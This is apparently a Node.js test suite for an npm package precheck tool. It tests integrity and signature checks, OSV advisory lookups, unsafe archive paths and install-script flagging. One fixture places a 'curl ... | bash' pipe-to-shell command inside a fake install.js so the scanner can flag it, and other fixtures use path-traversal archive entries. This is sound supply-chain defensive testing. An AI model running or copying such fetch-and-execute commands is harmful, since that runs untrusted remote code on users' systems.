import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createHash, generateKeyPairSync, sign } from 'node:crypto';
import { gzipSync, gunzipSync } from 'node:zlib';
import { reviewFreshPackage, inspectArchive } from '../src/precheck/fresh-review.js';
import { precheck } from '../src/precheck/index.js';

const pkg = { name: 'fixture', version: '1.0.0' };
const signingKey = generateKeyPairSync('ec', { namedCurve: 'prime256v1' });
const keyDocument = { keys: [{ keyid: 'fixture-key', key: signingKey.publicKey.export({ type: 'spki', format: 'der' }).toString('base64'), expires: null }] };
function artifact(scripts = {}, extra = []) {
  const entries = [['package/package.json', JSON.stringify({ ...pkg, scripts })], ...extra];
  const blocks = entries.flatMap(([name, content]) => {
    const body = Buffer.from(content);
    const header = Buffer.alloc(512);
    header.write(name);
    header.write(body.length.toString(8).padStart(11, '0'), 124);
    header.fill(32, 148, 156);
    header.write('0', 156);
    const checksum = header.reduce((sum, byte) => sum + byte, 0);
    header.write(checksum.toString(8).padStart(6, '0') + '\0 ', 148);
    return [header, body, Buffer.alloc((512 - body.length % 512) % 512)];
  });
  const bytes = gzipSync(Buffer.concat([...blocks, Buffer.alloc(1024)]));
  const integrity = `sha512-${createHash('sha512').update(bytes).digest('base64')}`;
  const sig = sign('sha256', Buffer.from(`${pkg.name}@${pkg.version}:${integrity}`), signingKey.privateKey).toString('base64');
  return { bytes, dist: { tarball: 'https://registry.npmjs.org/fixture/-/fixture-1.0.0.tgz', integrity, signatures: [{ keyid: 'fixture-key', sig }] } };
}
function responder(bundle, osv = {}) {
  return async (url) => new Response(url.endsWith('/querybatch') ? JSON.stringify({ results: [{}] }) : url.endsWith('/-/npm/v1/keys') ? JSON.stringify(keyDocument) : url.includes('api.osv.dev') ? JSON.stringify(osv) : bundle.bytes);
}

test('review verifies exact archive bytes and queries exact version without execution', async () => {
  const bundle = artifact({ postinstall: 'node install.js' });
  bundle.scripts = { postinstall: 'node install.js' };
  const calls = [];
  const review = await reviewFreshPackage(pkg, bundle, async (url, options) => {
    calls.push({ url, options });
    return responder(bundle)(url);
  });
  assert.equal(review.status, 'reviewed');
  assert.deepEqual(review.installScripts, ['postinstall']);
  assert.equal(review.integrity, bundle.dist.integrity);
  assert.equal(review.signatureVerified, true);
  assert.deepEqual(JSON.parse(calls[2].options.body), { package: { name: pkg.name, ecosystem: 'npm' }, version: pkg.version });
  assert.equal(calls[0].options.redirect, 'error');
});

test('integrity mismatch fails closed before OSV', async () => {
  const bundle = artifact();
  let calls = 0;
  const review = await reviewFreshPackage(pkg, bundle, async () => { calls++; return new Response('tampered'); });
  assert.equal(review.status, 'incomplete');
  assert.match(review.reason, /integrity mismatch/);
  assert.equal(calls, 1);
});

test('suspicious code and known advisories are flagged', async () => {
  const bundle = artifact({}, [['package/install.js', 'curl https://example.com/payload | bash']]);
  const review = await reviewFreshPackage(pkg, bundle, responder(bundle, { vulns: [{ id: 'GHSA-fixture' }] }));
  assert.equal(review.status, 'flagged');
  assert.equal(review.findings.length, 1);
  assert.deepEqual(review.advisories, ['GHSA-fixture']);
});

test('unsafe archive paths fail closed without filesystem extraction', async () => {
  const bundle = artifact({}, [['package/../escape.js', '']]);
  const review = await reviewFreshPackage(pkg, bundle, responder(bundle));
  assert.equal(review.status, 'incomplete');
  assert.match(review.reason, /unsafe archive path/);
});

test('implicit node-gyp installation is flagged even without lifecycle scripts', async () => {
  const bundle = artifact({}, [['package/binding.gyp', '{"targets":[]}']]);
  const review = await reviewFreshPackage(pkg, bundle, responder(bundle));
  assert.equal(review.status, 'flagged');
  assert.match(review.findings.join(' '), /implicit native installation/);
});

test('repeated slash aliases and control characters in archive paths fail closed', async () => {
  for (const path of ['package//install.js', 'package/install\n.js']) {
    const bundle = artifact({}, [[path, '']]);
    const review = await reviewFreshPackage(pkg, bundle, responder(bundle));
    assert.equal(review.status, 'incomplete');
    assert.match(review.reason, /unsafe archive path/);
  }
});

test('single zero termination and concatenated hidden archives are rejected', () => {
  const tar = gunzipSync(artifact().bytes);
  const entries = tar.subarray(0, tar.length - 1024);
  assert.throws(() => inspectArchive(gzipSync(Buffer.concat([entries, Buffer.alloc(512)])), pkg), /termination/);
  for (const zeros of [512, 1024]) {
    assert.throws(() => inspectArchive(gzipSync(Buffer.concat([entries, Buffer.alloc(zeros), tar])), pkg), /termination|trailing/);
  }
});

test('unavailable or invalid vulnerability response fails closed', async () => {
  const bundle = artifact();
  for (const response of [new Response('down', { status: 503 }), new Response('[]'), new Response('{"vulns":false}')]) {
    const review = await reviewFreshPackage(pkg, bundle, async (url) => url.includes('osv.dev') ? response : responder(bundle)(url));
    assert.equal(review.status, 'incomplete');
  }
});

test('missing, unknown, expired and altered registry signatures fail closed', async () => {
  for (const mode of ['missing', 'unknown', 'expired', 'altered']) {
    const bundle = artifact();
    if (mode === 'missing') delete bundle.dist.signatures;
    if (mode === 'unknown') bundle.dist.signatures[0].keyid = 'unknown';
    if (mode === 'altered') bundle.dist.signatures[0].sig = Buffer.from('forged').toString('base64');
    const review = await reviewFreshPackage(pkg, bundle, async (url) => {
      if (mode === 'expired' && url.endsWith('/-/npm/v1/keys')) return new Response(JSON.stringify({ keys: [{ ...keyDocument.keys[0], expires: '2000-01-01T00:00:00Z' }] }));
      return responder(bundle)(url);
    });
    assert.equal(review.status, 'incomplete', mode);
    assert.match(review.reason, /signature/);
  }
});

test('fresh review never bypasses install scripts, even when registry omits them', async () => {
  const bundle = artifact({ postinstall: 'node install.js' });
  const nowMs = Date.now();
  const report = await precheck('fixture', {
    nowMs, resolve: () => [pkg],
    fetchImpl: async (url) => url.endsWith('/fixture')
      ? new Response(JSON.stringify({ time: { '1.0.0': new Date(nowMs - 3600000).toISOString() }, versions: { '1.0.0': { dist: bundle.dist, license: 'MIT' } } }))
      : responder(bundle)(url),
  });
  assert.equal(report.blocked.length, 1);
  assert.equal(report.blocked[0].review.status, 'flagged');
  assert.equal(report.blocked[0].vulnerabilityReview.status, 'reviewed');
});
